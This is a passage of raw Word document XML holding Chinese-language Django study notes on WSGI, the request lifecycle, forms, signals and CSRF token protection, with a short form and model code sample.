        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
      <w:r w:rsidR="003942C2" w:rsidRPr="00652BA5">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:eastAsia="宋体" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="24292E"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB5F805" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>是web服务网关接口，是一套协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55F8C223" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>是通过以下模块实现了wsgi协议：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="433CAF54" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    - wsgiref</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A1EF19A" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    - werkzurg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60274A61" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">    - uwsgi   关于部署</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF8468A" w14:textId="766744AD" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>以上模块本质：编写socket服务端，用于监听请求，当有请求到来，则将请求数据进行封装，然后交给web框架处理。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EB6F36C" w14:textId="50665BD7" w:rsidR="003942C2" w:rsidRPr="00652BA5" w:rsidRDefault="00D92594"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021</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请求的生命周期？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72911B69" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">用户请求进来先走到  wsgi   然后将请求交给  jango的中间件   穿过django中间件（方法是process_request）  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726C65C8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">接着就是   路由匹配   路由匹配成功之后就执行相应的    视图函数   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D30843" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">在视图函数中可以调用orm做数据库操作  再从模板路径   将模板拿到   然后在后台进行模板渲染   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA56787" w14:textId="4389AD88" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>模板渲染完成之后就变成一个字符串     再把这个字符串经过所有中间件（方法：process_response）  和wsgi 返回给用户</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03817219" w14:textId="2382FE0E" w:rsidR="003942C2" w:rsidRDefault="003942C2" w:rsidP="003942C2">
      <w:pPr>
        <w:pStyle w:val="a7"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:spacing w:before="150" w:beforeAutospacing="0" w:after="150" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7F5C6771" wp14:editId="4BE0CB66">
            <wp:extent cx="9286875" cy="3324225"/>
            <wp:effectExtent l="0" t="0" r="9525"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86875" cy="3324225"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3409A5B5" w14:textId="427C6FCE"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022</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列举</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的内置组件？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7126D84F" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>form 组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A453A71" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- 对用户请求的数据进行校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C7DEE9" w14:textId="3AD9FF63" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- 生成HTML标签</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BF6A69" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>PS：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316208D9" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- form对象是一个可迭代对象。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18FA4A58" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>- 问题：choice的数据如果从数据库获取可能会造成数据无法实时更新</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5502DFD1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        - 重写构造方法，在构造方法中重新去数据库获取值。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A514A90" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">        - ModelChoiceField字段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA656E5" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">            from django.forms import Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47606E33" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">            from django.forms import fields</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597080A7" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">            from django.forms.models import ModelChoiceField</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C04769C" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">            class UserForm(Form):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624726BF" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">                name = fields.CharField(label='用户名',max_length=32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA652B0" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">                email = fields.EmailField(label='邮箱')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DBF19F5" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">                ut_id = ModelChoiceField(queryset=models.UserType.objects.all())    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175394B0" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C7BDEC1" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">            依赖：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371D8282" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">                class UserType(models.Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02247A64" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">                    title = models.CharField(max_length=32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C77F48B" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30ED4467" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">                    def __str__(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1694E041" w14:textId="2066825C" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">                        return self.title</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686BDBF4" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>信号、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE1FE47" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>django的信号其实就是django内部为开发者预留的一些自定制功能的钩子。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E4AD14" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>只要在某个信号中注册了函数，那么django内部执行的过程中就会自动触发注册在信号中的函数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D0B673" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">如： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F43FFA" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>pre_init # django的modal执行其构造方法前，自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4750BC" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>post_init # django的modal执行其构造方法后，自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F0F9E4" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>pre_save # django的modal对象保存前，自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EAF5F24" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>post_save # django的modal对象保存后，自动触发</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E1D493" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>场景:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00009FAF" w14:textId="582752BA" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>在数据库某些表中添加数据时，可以进行日志记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FAA76F" w14:textId="77777777" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>CSRF、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2680C6D6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>目标：防止用户直接向服务端发起POST请求。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F62344" w14:textId="21F09B41" w:rsidR="003942C2" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">对所有的post请求做验证/ 将jango生成的一串字符串发送给我们，一种是从请求体发过来，一种是放在隐藏的标签里面用的是process_view　</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A69418" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>方案：先发送GET请求时，将token保存到：cookie、Form表单中（隐藏的input标签），</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BEC4D7" w14:textId="2C20796C" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>以后再发送请求时只要携带过来即可。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="010A079C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="00D92594" w:rsidRDefault="003942C2" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
